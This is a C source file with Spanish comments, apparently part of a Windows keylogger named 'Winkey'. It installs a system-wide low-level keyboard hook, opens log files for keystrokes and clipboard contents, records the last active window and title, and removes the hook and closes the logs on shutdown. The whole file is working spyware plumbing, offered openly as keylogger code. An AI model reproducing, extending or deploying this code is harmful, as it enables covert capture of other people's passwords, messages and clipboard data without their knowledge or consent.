#include "winkey.h"

// Instala el hook de teclado de bajo nivel en el sistema
static BOOL InstallKeyboardHook(void)
{
    HINSTANCE moduleHandle;

    moduleHandle = GetModuleHandle(NULL);
    if (!moduleHandle)
        return FALSE;

    g_winkeyState.keyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        LowLevelKeyboardProc,
        moduleHandle,
        0
    );

    return (g_winkeyState.keyboardHook != NULL);
}

// Inicializa el estado global del keylogger a valores por defecto
static void InitializeWinkeyState(void)
{
    g_winkeyState.logFile = NULL;
    g_winkeyState.keyboardHook = NULL;
    g_winkeyState.lastWindow = NULL;
    memset(g_winkeyState.lastTitle, 0, sizeof(g_winkeyState.lastTitle));
}

// Activa todos los componentes del keylogger (logs y hooks)
BOOL ActivateHook(void)
{
    // Inicializa el estado del keylogger
    InitializeWinkeyState();

    // Intenta abrir el archivo de log principal
    if (!OpenLogFile()) {
        return FALSE;
    }

    // Intenta abrir el archivo de log del clipboard
    if (!OpenClipboardLog()) {
        // El clipboard no es crítico, continúa sin él
    }

    // Instala el hook de teclado de bajo nivel
    if (!InstallKeyboardHook()) {
        // Si falla, cierra los logs abiertos
        if (g_winkeyState.logFile) {
            fclose(g_winkeyState.logFile);
            g_winkeyState.logFile = NULL;
        }
        CloseClipboardLog();
        return FALSE;
    }

    return TRUE;
}

// Desactiva y limpia todos los componentes del keylogger
void DeactivateHook(void)
{
    // Desinstala el hook de teclado si está activo
    if (g_winkeyState.keyboardHook) {
        UnhookWindowsHookEx(g_winkeyState.keyboardHook);
        g_winkeyState.keyboardHook = NULL;
    }

    // Cierra el archivo de log principal si está abierto
    if (g_winkeyState.logFile) {
        fprintf(g_winkeyState.logFile, "=== Winkey Stopped ===\n");
        fflush(g_winkeyState.logFile);
        fclose(g_winkeyState.logFile);
        g_winkeyState.logFile = NULL;
    }

    // Cierra el log del clipboard
    CloseClipboardLog();

    // Reinicializa el estado
    InitializeWinkeyState();
}